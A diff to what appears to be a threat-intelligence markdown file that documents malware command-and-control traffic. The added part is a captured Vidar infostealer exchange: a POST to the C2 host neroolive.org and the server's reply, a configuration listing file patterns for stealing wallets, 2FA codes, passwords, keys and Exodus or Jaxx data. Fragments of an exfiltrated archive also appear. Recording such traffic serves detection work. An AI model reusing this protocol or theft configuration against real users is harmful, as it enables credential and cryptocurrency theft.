@@ -1768,8 +1768,34 @@ M....u..f..<..^..ek/.[...2...P=...3....>.................9J.V&.6..<....f.}......
 .......5.../History/history_Mozilla Firefox_nltxvmn2.default.txtUT
 .....]...]...]..+.......PK........0.HO..M(.....	....../information.txtUT
 ~~~
+~~~
+POST /517 HTTP/1.1
+Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
+Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
+Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
+Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
+Content-Length: 25
+Host: neroolive.org
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+--1BEF0A57BE110FD467A--
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 25 Oct 2019 13:27:12 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+Content-Encoding: gzip
+
+1,1,1,1,1,1,1,1,1,1,250,DESKTOP;%DESKTOP%\;*wallet*.*:*2fa*.*:*backup*.txt:*backup*.png:*backup*.jpg:*code*.txt:*code*.png:*code*.jpg:*password*.*:*auth*.txt:*auth*.png:*auth*.jpg:*crypto*.*:*key*.txt:*key*.png:*key*.jpg:*ledger*.*:*metamask*.*:*blockchain*.*:*bittrex*.*:*binance*.*:*coinbase*.*:*trezor*.*:*exodus*.*;300;true;movies:music:mp3;lnk;Exodus;%APPDATA%\Roaming\Exodus;*.*;4000;true;movies:music:mp3;JAXX;%APPDATA%\Roaming\Jaxx;*.*;4000;true;movies:music:mp3;
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-3.png "Vidar")
 
 #### Vjworm vjw0rm
 ~~~
